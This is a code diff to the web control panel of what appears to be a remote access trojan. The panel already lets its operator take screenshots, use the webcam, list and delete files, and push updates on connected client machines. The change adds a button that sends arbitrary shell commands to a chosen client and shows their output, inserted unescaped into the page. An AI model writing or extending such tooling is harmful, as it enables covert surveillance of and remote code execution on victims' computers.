@@ -91,6 +91,7 @@
                   <button onclick="screenshot(${c})">screenshot</button>
                   <button onclick="webcam(${c})">webcam</button>
                   <button onclick="ls(${c}, 'C://')">ls</button>
+                  <button onclick="exec(${c})">exec</button>
                   <button onclick="send(${c})">send</button>
                   <button onclick="sendUpdate(${c}, 'C://')">update</button>
                   <button onclick="sendoff(${c})">close</button>
@@ -117,7 +118,7 @@
       console.log(obj);
 
       try {
-        const ans = JSON.parse(obj.msg);
+        const ans = JSON.parse(obj.msg.replace(/\n/gim, ' '));
         if (ans.ls) {
           fileTree(obj.sid, ans.ls);
         } else if (ans.systeminfo) {
@@ -125,6 +126,8 @@
           $el.find('div table tr td.machine').html(ans.systeminfo.name);
           $el.find('div table tr td.system').html(ans.systeminfo.os);
           $el.find('div table tr td.payload').html(ans.systeminfo.payload);
+        } else if (ans.exec) {
+          $('#tree').html(ans.exec.output);
         }
       } catch(e) {
         $('#tree').html(obj.msg);
@@ -208,6 +211,12 @@
         socket.emit('client:send', {sid: cl, cmd: 'rm', args: {path: path + name}});
         ls(cl, path);
       }
+    }
+
+    function exec(cl) {
+      var cmd = prompt('command');
+      if (!cmd) return;
+      socket.emit('client:send', {sid: cl, cmd: 'exec', args: cmd});
     }
 
 
